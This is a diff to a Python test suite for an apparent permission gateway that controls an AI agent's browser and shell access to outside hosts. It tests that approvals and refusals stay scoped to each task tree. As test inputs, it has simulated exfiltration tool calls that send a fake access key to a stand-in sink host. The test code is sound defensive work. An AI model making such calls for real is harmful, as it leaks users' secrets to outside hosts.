@@ -19,6 +19,7 @@ from ferb.core.types import ActionSpec, Identity, TabRef, Target
 from ferb.policy import confirm, provenance
 from ferb.policy.destinations import KnownDestinations
 from tests.conftest import Answers, FakeCap, RunningDaemon, gateway_request, gateway_setup, gateway_tool_call
+from tests.mackit import grant_task
 
 SHELL = {"shell", "probe"}
 PRIVATE_KEY_VALUE = "s3cretvalue"                         # a private token, not a shape the redactor strips
@@ -343,8 +344,47 @@ def test_a_yes_in_one_tree_is_known_in_a_later_tree_browser_then_shell(daemon: R
     assert not gateway_tool_call(daemon, grant, "ferb_browser.open", url="https://sink.example/?k=AKIAEXAMPLE7")["is_error"]
     owner.stop()
     assert _known(daemon, "host", "sink.example")         # the browser Yes made it a known destination
-    # a later tree's shell command to the same host is allowed without asking (a known host short-circuits the check)
-    ok, _why = daemon.run(daemon.daemon.gateway.destination_allowed("none", "sink.example", 443))
+    # A later tree's tracked shell process inherits the known host, while a process with no task fails closed.
+    later = grant_task(daemon, "later", Identity.OWNER, SHELL, "check the server")
+    daemon.call_soon(setattr, daemon.daemon.gateway, "proc_task", lambda proc: later.task_id if proc == "later" else None)
+    ok, _why = daemon.run(daemon.daemon.gateway.destination_allowed("later", "sink.example", 443))
+    assert ok
+    unknown, _why = daemon.run(daemon.daemon.gateway.destination_allowed("none", "sink.example", 443))
+    assert not unknown
+
+
+@pytest.mark.parametrize("family", [FERB_BROWSER, OWNER_BROWSER], ids=["ferb", "owner"])
+def test_a_tree_no_stays_final_after_another_tree_makes_the_host_known(
+        daemon: RunningDaemon, family: Family) -> None:
+    refused, first_browser = _browser_grant(daemon, family, "summarize this report", _caps())
+    _trifecta(daemon, refused)
+    owner = Answers(daemon, granted=False, choice=2)
+    try:
+        first = gateway_tool_call(daemon, refused, f"{family.prefix}.open", url="https://sink.example/?k=AKIAEXAMPLE7")
+    finally:
+        owner.stop()
+    assert first["is_error"] and first_browser.calls == 0
+
+    allowed = grant_task(daemon, "allowed", Identity.OWNER, {family.read, "probe"}, "summarize another report")
+    _trifecta(daemon, allowed)
+    owner = Answers(daemon, granted=True, choice=1)
+    try:
+        second = gateway_tool_call(daemon, allowed, f"{family.prefix}.open", url="https://sink.example/?k=AKIAEXAMPLE7")
+    finally:
+        owner.stop()
+    assert not second["is_error"] and _known(daemon, "host", "sink.example")
+
+    for url in ("https://sink.example/?k=AKIAEXAMPLE7", "https://sink.example/public"):
+        result = gateway_tool_call(daemon, refused, f"{family.prefix}.open", url=url)
+        assert result["is_error"] and "already said no" in result["content"]["error"]
+    assert first_browser.calls == 1 and len(_asked(daemon)) == 2
+
+    # Shell and browser share the tree's No, even though the other tree's Yes is now globally known.
+    daemon.call_soon(setattr, daemon.daemon.gateway, "proc_task",
+                     lambda proc: refused.task_id if proc == "refused" else allowed.task_id)
+    ok, why = daemon.run(daemon.daemon.gateway.destination_allowed("refused", "sink.example", 443))
+    assert not ok and "you said no" in why
+    ok, _why = daemon.run(daemon.daemon.gateway.destination_allowed("allowed", "sink.example", 443))
     assert ok
 
 
@@ -683,7 +723,7 @@ def test_an_earlier_host_is_allowed_only_in_the_tree_that_reached_it(daemon: Run
     result = gateway_tool_call(daemon, first, "shell.run", command=f"curl -s http://localtest.ferb:{origin}/a")
     assert "hello" in result["content"]["output"]
     assert not _known(daemon, "host", "localtest.ferb")
-    second, _ = gateway_setup(daemon, SHELL, gateway_request("read the report"), _caps())
+    second = grant_task(daemon, "second", Identity.OWNER, SHELL, "read the report")
     gateway_tool_call(daemon, second, "probe.web")
     result = gateway_tool_call(daemon, second, "shell.run",
                                command=f"curl -s -o /dev/null -w '%{{http_code}}' http://localtest.ferb:{origin}/b")
